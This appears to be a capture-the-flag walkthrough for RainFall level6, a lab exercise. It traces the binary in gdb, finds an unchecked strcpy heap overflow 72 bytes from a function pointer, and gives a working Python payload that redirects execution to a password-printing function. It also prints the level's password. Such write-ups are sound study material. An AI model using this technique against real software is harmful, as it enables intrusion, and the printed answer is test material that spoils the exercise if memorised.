TLDR
```
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   .
   .
   .
   .
   0x080484ba <+62>:	mov    0x1c(%esp),%eax     dst = buffer ptr allocated by first malloc
   0x080484be <+66>:	mov    %edx,0x4(%esp)      src = av1 
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   
   char *strcpy( *dst, *src);
   
   last thing called is unprotected strcpy == overwrite the eip
```

details

```
0x08048454  n // shell
0x08048468  m // call puts
0x0804847c  main
```


b at
```
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
=> 0x080484ca <+78>:	mov    0x18(%esp),%eax
```

```
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)

allocate addr in the heap, store it in eax, then move it to $esp+0x1c

(gdb) x $esp+0x1c
      0xbffff6bc:	0x0804a008 [HEAP]

   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   

allocate addr in the heap, store it in eax, then move it to 0x18(%esp)

   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax

   make that addr point to fun m()-puts-
```

send 64 chars and inspect the heap

(gdb) info proc mappings

heap starts at 0x804a000

```
(gdb) x/40wx 0x804a000

0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x00000000	0x00000011
0x804a050:	0x08048468

```
addr of func m() [0x08048468] could be seen in the heap 8 addr away from argv[1]
```
(gdb) p 64 + 4 + 4
$1 = 72
```


```
level6@RainFall:~$ ./level6  $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

```
man strcpy

SECURITY CONSIDERATIONS
     The strcpy() function is easily misused in a manner which enables mali-
     cious users to arbitrarily change a running program's functionality
     through a buffer overflow attack.
```

buffer argv1 is `movl   $0x40,(%esp)` = 64, we fuzz until the binary segv:

or maybe try cyclic tool:
```
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
pass it as argv in gdb:
```
(gdb) run "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"

Program received signal SIGSEGV, Segmentation fault.
0x61616173
```

```
unhex 61616173 | rev
saaa

cyclic -l saaa
72
```
```
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72')
Segmentation fault (core dumped)
```
overflow the EIP with the addr of n()  0x08048454 
```
./level6 $(python -c 'print "A"*72 + "\x08\x04\x84\x54"[::-1]')

f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```











